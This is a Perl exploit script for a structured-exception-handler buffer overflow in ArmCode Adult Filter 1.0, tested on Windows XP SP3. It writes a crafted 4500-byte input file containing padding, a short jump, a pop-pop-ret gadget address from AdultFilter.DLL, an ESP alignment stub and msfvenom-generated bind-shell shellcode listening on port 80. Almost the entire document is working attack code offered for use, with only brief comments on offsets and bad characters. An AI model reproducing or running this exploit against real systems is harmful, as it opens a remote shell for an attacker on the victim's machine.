#!/usr/bin/perl

# ArmCode Adult Filter 1.0 SEH exploit (http://www.armcode.com/adult-filter/index.htm)
# Tested against Microsoft Windows XP Professional Version 2002 Service Pack 3 

$baddata = "\x41" x 4108; # exact offset at 4112

$baddata .= "\xEB\x06\x90\x90";

# 0x025a7434 : pop ecx # pop ebp # ret 0x04 | ascii {PAGE_EXECUTE_READ} [AdultFilter.DLL] 
# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.0.4.23 
# (C:\Program Files\Adult Filter\AdultFilter.DLL)

$baddata .= pack('V',0x025a7434);

# badchars = \x00\x0a\x0d

$baddata .= "\x66\x81\xc4\x0c\x14"; # aligning ESP; ADD SP, 140C
$baddata .= "\x90" x 3;

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00\x0a\x0d" BufferRegister=ESP -f perl -v baddata

$baddata .= "\x89\xe2\xbf\xa0\x9a\xa1\xe7\x29\xc9\xb1\x53\x83\xea\xfc" .
"\x31\x7a\x0e\x03\xda\x94\x43\x12\xe6\x41\x01\xdd\x16\x92" .
"\x66\x57\xf3\xa3\xa6\x03\x70\x93\x16\x47\xd4\x18\xdc\x05" .
"\xcc\xab\x90\x81\xe3\x1c\x1e\xf4\xca\x9d\x33\xc4\x4d\x1e" .
"\x4e\x19\xad\x1f\x81\x6c\xac\x58\xfc\x9d\xfc\x31\x8a\x30" .
"\x10\x35\xc6\x88\x9b\x05\xc6\x88\x78\xdd\xe9\xb9\x2f\x55" .
"\xb0\x19\xce\xba\xc8\x13\xc8\xdf\xf5\xea\x63\x2b\x81\xec" .
"\xa5\x65\x6a\x42\x88\x49\x99\x9a\xcd\x6e\x42\xe9\x27\x8d" .
"\xff\xea\xfc\xef\xdb\x7f\xe6\x48\xaf\xd8\xc2\x69\x7c\xbe" .
"\x81\x66\xc9\xb4\xcd\x6a\xcc\x19\x66\x96\x45\x9c\xa8\x1e" .
"\x1d\xbb\x6c\x7a\xc5\xa2\x35\x26\xa8\xdb\x25\x89\x15\x7e" .
"\x2e\x24\x41\xf3\x6d\x21\xa6\x3e\x8d\xb1\xa0\x49\xfe\x83" .
"\x6f\xe2\x68\xa8\xf8\x2c\x6f\xcf\xd2\x89\xff\x2e\xdd\xe9" .
"\xd6\xf4\x89\xb9\x40\xdc\xb1\x51\x90\xe1\x67\xcf\x98\x44" .
"\xd8\xf2\x65\x36\x88\xb2\xc5\xdf\xc2\x3c\x3a\xff\xec\x96" .
"\x53\x68\x11\x19\x5b\x39\x9c\xff\x31\xa9\xc8\xa8\xad\x0b" .
"\x2f\x61\x4a\x73\x05\xd9\xfc\x3c\x4f\xde\x03\xbd\x45\x48" .
"\x93\x36\x8a\x4c\x82\x48\x87\xe4\xd3\xdf\x5d\x65\x96\x7e" .
"\x61\xac\x40\xe2\xf0\x2b\x90\x6d\xe9\xe3\xc7\x3a\xdf\xfd" .
"\x8d\xd6\x46\x54\xb3\x2a\x1e\x9f\x77\xf1\xe3\x1e\x76\x74" .
"\x5f\x05\x68\x40\x60\x01\xdc\x1c\x37\xdf\x8a\xda\xe1\x91" .
"\x64\xb5\x5e\x78\xe0\x40\xad\xbb\x76\x4d\xf8\x4d\x96\xfc" .
"\x55\x08\xa9\x31\x32\x9c\xd2\x2f\xa2\x63\x09\xf4\xc2\x81" .
"\x9b\x01\x6b\x1c\x4e\xa8\xf6\x9f\xa5\xef\x0e\x1c\x4f\x90" .
"\xf4\x3c\x3a\x95\xb1\xfa\xd7\xe7\xaa\x6e\xd7\x54\xca\xba";

$baddata .= "\x43" x (4500-length($baddata));

$file = "adult_filter_.txt";
open(FILE, ">$file");
print FILE $baddata;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($baddata) . "\n";
